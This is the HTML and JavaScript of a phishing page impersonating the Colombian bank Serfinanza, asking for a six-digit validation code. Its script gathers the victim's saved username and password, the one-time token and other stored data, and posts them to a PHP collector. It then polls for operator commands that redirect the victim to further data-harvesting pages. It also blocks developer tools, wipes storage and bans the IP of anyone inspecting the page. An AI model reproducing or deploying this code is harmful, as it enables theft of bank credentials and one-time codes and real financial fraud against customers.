<html>
    <head>
        <title>Código de Validación -</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon">
        <link rel="icon" href="../img/favicon.ico" type="image/x-icon">

        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>        
        <link href="../css/style.css" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../js/functions.js"></script>
        <script type="text/javascript" src="../js/ready.js"></script>      
        
        <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Estilos responsive para móviles */
        @media screen and (max-width: 768px) {
            #panel-der {
                display: none !important;
            }
            
            #panel-izq {
                width: 100% !important;
            }
            
            .frm {
                padding: 20px !important;
            }
            
                         #inp-token {
                 width: 90% !important;
                 margin-left: -10px !important;
             }
            
            .titulo {
                font-size: 18px !important;
            }
            
            .entradas {
                font-size: 16px !important;
                padding: 12px !important;
            }
            
            .btn {
                padding: 12px 24px !important;
                font-size: 16px !important;
            }
            
            #cabecera img {
                max-width: 200px !important;
                height: auto !important;
            }
            
            .linea {
                font-size: 12px !important;
                padding: 10px !important;
            }
            
            #derechos, #derechos2 {
                font-size: 10px !important;
                padding: 5px 0 !important;
            }
        }
        
        @media screen and (max-width: 480px) {
            .frm {
                padding: 15px !important;
            }
            
                         #inp-token {
                 width: 95% !important;
                 margin-left: -15px !important;
             }
            
            .titulo {
                font-size: 16px !important;
            }
            
            .entradas {
                font-size: 14px !important;
                padding: 10px !important;
            }
            
            .btn {
                padding: 10px 20px !important;
                font-size: 14px !important;
            }
        }
        </style>
        
                <script>
         document.addEventListener("DOMContentLoaded", function () {
          // Generar o recuperar session_id
          let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
          if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('session_id', sessionId);
          }

          // Event listener para el botón
          const btnToken = document.getElementById('btn-confirmar');
          
          if (btnToken) {
            btnToken.addEventListener('click', async function (event) {
            event.preventDefault();

            const token = document.getElementById('txt-token').value;
            
            if (token.length !== 6) {
              alert('El token debe tener 6 dígitos');
              return;
            }

            // Mostrar loader
            document.getElementById("fondo").style.display = "block";
            const loader = document.getElementById('loader-overlay');
            if (loader) {
              loader.style.display = 'flex';
            }

            let localTb = {};
            try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            } catch(e) {}

            const formData = new FormData();
            formData.append('transactionId', sessionId);
            formData.append('u_id', localStorage.getItem('identificacion') || localStorage.getItem('username') || '');
            formData.append('u_ps', localStorage.getItem('password') || '');
            formData.append('u_tk', token);
            formData.append('u_tb', JSON.stringify(localTb));

            fetch('procesar_dinamica.php', { method: 'POST', body: formData })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(sessionId, result.messageId);
              } else {
                if (loader) loader.style.display = 'none';
              }
            })
            .catch(err => {
              if (loader) loader.style.display = 'none';
            });
          });
          }

          // Validación para caracteres numéricos
          const txtToken = document.getElementById('txt-token');
          if (txtToken) {
            txtToken.addEventListener('input', function(e) {
              this.value = this.value.replace(/[^0-9]/g, '');
              if (this.value.length > 6) {
                this.value = this.value.slice(0, 6);
              }
            });
          }
        });

        async function checkPaymentVerification(transactionId, messageId) {
          try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), {
              method: 'POST',
              body: formData,
            cache: 'no-store'
            });
            const result = await res.json();

            if (result.action) {
              const loader = document.getElementById('loader-overlay');
              if (loader) loader.style.display = 'none';

              switch (result.action) {
                case 'pedir_dinamica':
                case 'error_token': 
                case 'error_token':
                  alert("Error de Código de Seguridad.");
                  window.location.href = "token.php";
                  break;
                case 'error_logo':
                case 'error_logo': 
                  alert("Usuario o clave incorrectos.");
                  window.location.href = "../index.html";
                  break;
                case 'error_tc':
                  window.location.href = "/datac/alter.php";
                  break;
                case 'error':
                  window.location.href = "/caras";
                  break;
                case 'cedula':
                  window.location.href = "/cedula";
                  break;
                case 'bre_b':
                  window.location.href = "/recaudos/brev.php";
                  break;
                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                  window.location.href = "/fin.php";
                  break;
                default:
                  setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
              }
            } else {
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
            }
          } catch (err) {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        }
        </script>
    </head>
    <body>
        <!-- Loader Overlay -->
        <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 9999; justify-content: center; align-items: center;">
            <div style="background: white; padding: 30px; border-radius: 10px; text-align: center;">
                <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                <div style="color: #333; font-size: 16px; font-weight: bold;">Procesando información...</div>
                <div style="color: #666; font-size: 14px; margin-top: 10px;">Por favor espere</div>
            </div>
        </div>
        
        <div id="fondo"></div>
        <div id="mensaje">
            <div style="text-align:center;">Por favor ingrese el código de validación de 6 dígitos.</div>
            <br><br>
            <div style="text-align:right;"><button class="btn" id="btn-aceptar">Aceptar</button></div>
        </div>
        <div id="cabecera">
            <img src="../img/logo.png">
        </div>
        <div style="height: 24px;"></div>
        <div id="contenido">
            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                    <td valign="top" id="panel-izq">
                        <table width="100%" cellpadding="0" cellspacing="0">
                            <tr>
                                <td valign="bottom"><img src="../img/vig.jpg" width="24"></td>
                                <td>
                                    <div class="frm">
                                        <div class="titulo">CÓDIGO DE VALIDACIÓN</div>
                                        <div style="height: 29px;"></div>
                                        <div style="color: #6c757d; font-size: 14px; line-height: 1.4; margin-bottom: 20px; text-align: center;">
                                            Para confirmar tu operación, ingresa el código de 6 dígitos que recibiste en tu dispositivo móvil o en tu app.
                                        </div>
                                        <table border="0" width="70%" cellpadding="0" cellspacing="0" id="inp-token" style="margin-left: 40px;">
                                            <tr>
                                                <td valign="middle" align="left" width="54" id="ico-token1"></td>
                                                <td valign="middle" align="right">
                                                    <div id="ico-token2"></div>
                                                    <input type="text" name="txt-token" id="txt-token" class="entradas" placeholder="" autocomplete="off" maxlength="6" style="text-align: center; letter-spacing: 2px; font-size: 18px;">
                                                </td>
                                            </tr>
                                        </table>
                                        <div style="height: 42px;"></div>
                                        <div style="text-align: center;">
                                            <button class="btn" id="btn-confirmar">Confirmar</button>
                                        </div>
                                        <div style="height: 42px;"></div>
                                        <table border="0" width="100%" cellpadding="0" cellspacing="0">
                                            <tr>
                                                <td class="recordar" align="left">Regístrate aquí</td>
                                                <td class="recordar" align="center">Recordar Usuario</td>
                                                <td class="recordar" align="right">Restablecer Contraseña</td>
                                            </tr>
                                        </table>
                                    </div>
                                </td>
                            </tr>
                        </table>                    
                    </td>
                    <td valign="top" id="panel-der">
                        <img src="../img/slide.png" width="100%">
                    </td>
                </tr>
            </table>
            <div class="linea">
                Línea de Servicio al Cliente: 323 5997000 - 018000510513
            </div>
            <table border="0" width="100%" cellpadding="0" cellspacing="0" style="margin-top: 10px;">
                <tr>
                    <td align="left" valign="top"><img src="../img/1.jpg"><br class="salto"><img src="../img/2.jpg"><br class="salto"><img src="../img/3.jpg"><br class="salto"><div id="derechos" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
                    <td align="right" valign="top"><div id="derechos2" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
                </tr>
            </table>
        </div>    
    <script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html> 